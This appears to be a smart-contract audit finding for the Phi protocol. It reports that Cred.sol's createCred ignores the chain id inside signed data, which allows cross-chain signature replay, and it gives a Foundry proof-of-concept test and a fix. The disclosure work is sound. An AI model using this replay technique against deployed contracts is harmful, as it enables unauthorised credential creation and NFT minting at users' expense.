# Vulnerability details

## Impact

Unauthorized creation of credentials on another chain, replaying the signature obtained for a specific chain. May lead to unauthorized minting of NFTs, or users buying shares/NFTs from wrong creators.

## Summary

[Cred.sol::createCred](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/Cred.sol#L231-L280) ignores the chain id embedded into the supplied signature:

```solidity
if (_recoverSigner(keccak256(signedData_), signature_) != phiSignerAddress) revert AddressNotSigned();
(
    uint256 expiresIn,
    address sender,
    ,  // <<=== chainId here is ignored
    address bondingCurve,
    string memory credURL,
    string memory credType,
    string memory verificationType,
    bytes32 merkleRoot_
) = abi.decode(signedData_, (uint256, address, uint256, address, string, string, string, bytes32));
```

While all other parameters of the signature are checked for validity, `chainId` is ignored; this allows to replay on any other chain the signature obtained from the Phi signing authority for a specific chain. Unauthorized creation of credentials may lead to other impacts: e.g. unauthorized minting of NFTs, or users buying shares/NFTs from the wrong creators.

## Proof of Concept

Drop this test to [Cred.t.sol](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/test/Cred.t.sol#L61) and execute via `forge test --match-test Kuprum`

```solidity
    function testKuprum_createCredOnAnotherChain() public {
        uint256 credId = 1;
        uint256 supply = 0;
        uint256 amount = 1;
        uint256 expiresIn = START_TIME + 100;
        uint256 buyPrice = bondingCurve.getBuyPriceAfterFee(credId, supply, amount);
        string memory credURL = "test";
        
        // The signature is obtained for another chain
        uint256 otherChainId = 99999;
        assertNotEq(otherChainId, block.chainid);
        bytes memory signCreateData = abi.encode(
            expiresIn, participant, otherChainId, address(bondingCurve), credURL, "BASIC", "SIGNATURE", 0x0
        );
        bytes32 createMsgHash = keccak256(signCreateData);
        bytes32 createDigest = ECDSA.toEthSignedMessageHash(createMsgHash);
        (uint8 cv, bytes32 cr, bytes32 cs) = vm.sign(claimSignerPrivateKey, createDigest);
        if (cv != 27) cs = cs | bytes32(uint256(1) << 255);

        // We replay the signature designated for another chain on this chain
        vm.warp(START_TIME + 1);
        vm.startPrank(participant);
        cred.createCred{ value: buyPrice }(participant, signCreateData, abi.encodePacked(cr, cs), 100, 100);
        vm.stopPrank();
        // Cred created successfully on the wrong chain
        assertEq(cred.isShareHolder(1, participant), true, "cred 1 is voted by participant");
    }
```

## Tools Used

Manual review; Foundry

## Recommended Mitigation Steps

Validate that the `chainId` embedded into the signature matches `block.chainid`.
